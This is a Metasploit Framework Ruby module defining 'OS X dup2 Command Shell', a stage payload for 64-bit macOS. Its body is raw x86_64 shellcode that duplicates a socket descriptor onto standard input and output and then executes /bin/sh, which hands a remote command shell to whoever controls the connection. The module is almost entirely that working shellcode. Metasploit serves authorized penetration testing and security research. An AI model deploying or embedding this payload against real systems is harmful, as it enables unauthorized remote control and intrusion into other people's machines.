##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X dup2 Command Shell',
      'Description'   => 'dup2 socket in edi, then execve',
      'Author'        => 'nemo',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64,
      'Session'       => Msf::Sessions::CommandShell,
      'Stage'         =>
        {
          'Payload' =>
            "\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"+
            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8"+
            "\x3b\x00\x00\x02\xe8\x08\x00\x00\x00\x2f\x62\x69"+
            "\x6e\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2"+
            "\x52\x57\x48\x89\xe6\x0f\x05"
        }
      ))
  end

end
